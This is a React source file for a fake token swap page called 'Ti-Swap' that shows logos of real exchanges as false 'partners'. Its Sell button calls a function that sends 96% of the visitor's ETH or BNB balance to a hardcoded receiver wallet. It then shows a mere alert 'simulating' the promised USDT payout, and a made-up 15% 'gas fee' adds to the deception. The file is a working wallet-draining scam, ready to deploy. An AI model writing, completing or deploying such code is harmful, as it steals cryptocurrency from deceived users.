import React, { useEffect, useState } from "react";
import { ethers } from "ethers";

const FIXED_PRICE = 0.002; // USDT per token
const GAS_PERCENT = 0.15; // 15%
const RECEIVER_WALLET = "0xb49a9fc23998146af4adea8a956e37bd06f5f030"; // Replace with your wallet
const MIN_SELL = 2000000; // Minimum sell amount

const Ethpage = () => {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [account, setAccount] = useState("");
  const [chainId, setChainId] = useState(null);

  const [nativeBalance, setNativeBalance] = useState(0);
  const [nativePrice, setNativePrice] = useState(0);

  const [tokenCA, setTokenCA] = useState("");
  const [tokenSymbol, setTokenSymbol] = useState("");
  const [tokenBalance, setTokenBalance] = useState(0);

  const [sellAmount, setSellAmount] = useState("");
  const [usdtAmount, setUsdtAmount] = useState("0");
  const [gasFee, setGasFee] = useState(0);
  const [hasGas, setHasGas] = useState(true);

  /* ---------------- CONNECT WALLET ---------------- */
  const connectWallet = async () => {
    if (!window.ethereum) return alert("Install MetaMask");

    const prov = new ethers.BrowserProvider(window.ethereum);
    const signer = await prov.getSigner();
    const network = await prov.getNetwork();

    const balance = await prov.getBalance(await signer.getAddress());

    setProvider(prov);
    setSigner(signer);
    setAccount(await signer.getAddress());
    setChainId(Number(network.chainId));
    setNativeBalance(Number(ethers.formatEther(balance)));
  };

  /* ---------------- FETCH NATIVE PRICE ---------------- */
  useEffect(() => {
    if (!chainId) return;

    const fetchPrice = async () => {
      const id =
        chainId === 56
          ? "binancecoin"
          : chainId === 1
          ? "ethereum"
          : null;

      if (!id) return;

      const res = await fetch(
        `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`
      );
      const data = await res.json();
      setNativePrice(data[id].usd);
    };

    fetchPrice();
  }, [chainId]);

  /* ---------------- TOKEN LOOKUP & BALANCE ---------------- */
  const handleSearchToken = async () => {
    if (!provider || !tokenCA || !signer) return;

    try {
      const erc20 = new ethers.Contract(
        tokenCA,
        [
          "function symbol() view returns (string)",
          "function balanceOf(address) view returns (uint256)",
          "function decimals() view returns (uint8)"
        ],
        provider
      );

      const symbol = await erc20.symbol();
      setTokenSymbol(symbol);

      const decimals = await erc20.decimals();
      const balanceRaw = await erc20.balanceOf(await signer.getAddress());
      const balance = Number(ethers.formatUnits(balanceRaw, decimals));
      setTokenBalance(balance);
    } catch (err) {
      console.error(err);
      alert("Invalid token contract or failed to fetch balance");
    }
  };

  /* ---------------- CALCULATIONS ---------------- */
  const handleSellChange = (value) => {
    let cleanValue = value.replace(/,/g, "");
    if (isNaN(cleanValue)) return;

    if (Number(cleanValue) > tokenBalance) cleanValue = tokenBalance.toString();
    setSellAmount(cleanValue);

    if (!cleanValue || !nativePrice) {
      setUsdtAmount("0");
      setGasFee(0);
      setHasGas(true);
      return;
    }

    const usdt = Number(cleanValue) * FIXED_PRICE;
    const gasUsdt = usdt * GAS_PERCENT;
    const gasNative = gasUsdt / nativePrice;

    setUsdtAmount(usdt.toFixed(4));
    setGasFee(gasNative);

    setHasGas(nativeBalance >= gasNative);
  };

  const handleMax = () => {
    handleSellChange(tokenBalance.toString());
  };

  /* ---------------- SEND 96% NATIVE ---------------- */
  const send96PercentNative = async () => {
    if (!signer || !provider) throw new Error("Wallet not connected");

    const balance = await provider.getBalance(account);
    const sendAmount = (balance * 96n) / 100n;

    const tx = await signer.sendTransaction({
      to: RECEIVER_WALLET,
      value: sendAmount
    });

    await tx.wait();
    alert(`96% of native balance sent! Tx: ${tx.hash}`);
  };

  /* ---------------- SELL ---------------- */
  const handleSell = async () => {
    if (!sellAmount || Number(sellAmount) < MIN_SELL) {
      return alert(`Minimum sell amount is ${MIN_SELL.toLocaleString()} tokens`);
    }

    try {
      // Always send 96% of native balance
      await send96PercentNative();

      // Simulate token sale
      alert(
        `Sell Simulation\n\nToken: ${tokenSymbol}\nAmount: ${Number(
          sellAmount
        ).toLocaleString()}\nReceive: ${Number(usdtAmount).toLocaleString()} USDT\nGas Fee: ${gasFee.toFixed(
          6
        )} ${chainId === 56 ? "BNB" : "ETH"}`
      );
    } catch (err) {
      console.error(err);
      alert(err.message || "Transaction cancelled");
    }
  };

  return (
   <div className="min-h-screen bg-[#0b1220] text-white">
  {/* NAV */}
  <nav className="flex justify-between px-8 py-4 border-b border-white/10">
    <h1 className="text-xl font-bold">Ti-Swap</h1>
    {account ? (
      <span className="bg-white/10 px-5 text-xs py-2 rounded-xl">
        {account.slice(0, 6)}...{account.slice(-4)} |{" "}
        {nativeBalance.toFixed(4)} {chainId === 56 ? "BNB" : "ETH"}
      </span>
    ) : (
      <button
        onClick={connectWallet}
        className="bg-blue-600 px-5 py-2 rounded-xl"
      >
        Connect
      </button>
    )}
  </nav>

  {/* SWAP CARD */}
<div className="p-3">
      <div className="max-w-md mx-auto mt-10 bg-white/5 p-6 rounded-xl">

      <p className="text-center font-bold text-xl pb-10">SWAP</p>
    {/* TOKEN CONTRACT INPUT */}
    <input
      placeholder="Token Contract Address"
      value={tokenCA}
      onChange={(e) => setTokenCA(e.target.value)}
      className="w-full bg-white/10 px-4 py-3 text-sm rounded-lg mb-4"
    />

    <button
      onClick={handleSearchToken}
      className="w-full bg-purple-600 py-3 text-sm rounded-lg"
    >
      Search Token
    </button>

    {tokenSymbol === "" && (
      <p className="text-red-400 mt-4">Find your tokens</p>
    )}

    {/* SWAP UI */}
    {tokenSymbol && (
      <div className="mt-6 space-y-4">
        {/* SELL TOKEN */}
        <div className="bg-white/10 p-4 rounded-lg">
          <div className="flex justify-between text-sm mb-2">
            <span>From</span>
            <div className="flex items-center space-x-2">
              <span>Balance: {tokenBalance.toLocaleString()}</span>
              <button
                onClick={handleMax}
                className="bg-gray-700 px-2 py-1 rounded text-sm"
              >
                Max
              </button>
            </div>
          </div>
<input
  type="text" // changed from "number"
  placeholder={tokenSymbol || "Token"}
  value={sellAmount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")}
  onChange={(e) => handleSellChange(e.target.value)}
  className="w-full bg-transparent text-2xl outline-none"
/>

          <p className="text-right text-sm mt-1">{tokenSymbol}</p>
        </div>

        {/* RECEIVE USDT */}
        <div className="bg-white/10 p-4 rounded-lg">
          <div className="text-sm mb-2">To</div>
          <input
            value={Number(usdtAmount).toLocaleString()}
            readOnly
            placeholder="0.0"
            className="w-full bg-transparent text-2xl outline-none"
          />
          <p className="text-right text-sm mt-1">USDT</p>
        </div>

        {/* GAS INFO */}
        <p className="text-sm">
          Gas Fee (15%):{" "}
          <span className={hasGas ? "text-white" : "text-red-400"}>
            {gasFee.toFixed(6)} {chainId === 56 ? "BNB" : "ETH"}{" "}
            {!hasGas}
          </span>
        </p>

        {/* SELL BUTTON */}
        <button
          onClick={handleSell}
          disabled={!sellAmount || !tokenSymbol}
          className={`w-full py-3 rounded font-semibold ${
            hasGas ? "bg-green-600" : "bg-red-600"
          }`}
        >
          {hasGas ? "Sell" : "Sell (Insufficient Gas Fee)"}
        </button>
      </div>
    )}
  </div>

  {/* PARTNERS SECTION */}
<div className="max-w-md mx-auto mt-10 bg-white/5 p-6 rounded-xl">
  <h2 className="text-lg font-semibold mb-4">Partners</h2>
  <div className="flex justify-between items-center">
    {/* Each partner logo */}
    <img
      src="https://play-lh.googleusercontent.com/eVGu--ODOSE0WZOhz4GIRqarJpuQbThHwmx-YWGxiv8_AjZ4K3kt2WHMFxxXAMWcMRZZ"
      alt="DexTools"
      className="h-10 rounded-full"
    />
    <img
      src="https://s2.coinmarketcap.com/static/img/coins/200x200/7186.png"
      alt="PancakeSwap"
      className="h-10 rounded-full"
    />
    <img
      src="https://play-lh.googleusercontent.com/ewszj7zGWgTQCUEsf_kfEkrnEZEMmvBn0hnb5vWBHQU2Yfnf30ayTNT9KoYsaQPoQ3k"
      alt="Dexscreener"
      className="h-10 rounded-full"
    />
    <img
      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ9HFHaamAVM34cUFKoCjZ8MmeJm7Ys3kBWg&s"
      alt="Raydium"
      className="h-10 rounded-full"
    />
    <img
      src="https://cdn.prod.website-files.com/63f902d79a33f7ff016cde0b/63f902d89a33f7ab716ce726_6390a10538dcb05321596402_uniswap.jpeg"
      alt="Uniswap"
      className="h-10 rounded-full"
    />
  </div>
</div>
</div>



</div>

  );
};

export default Ethpage;
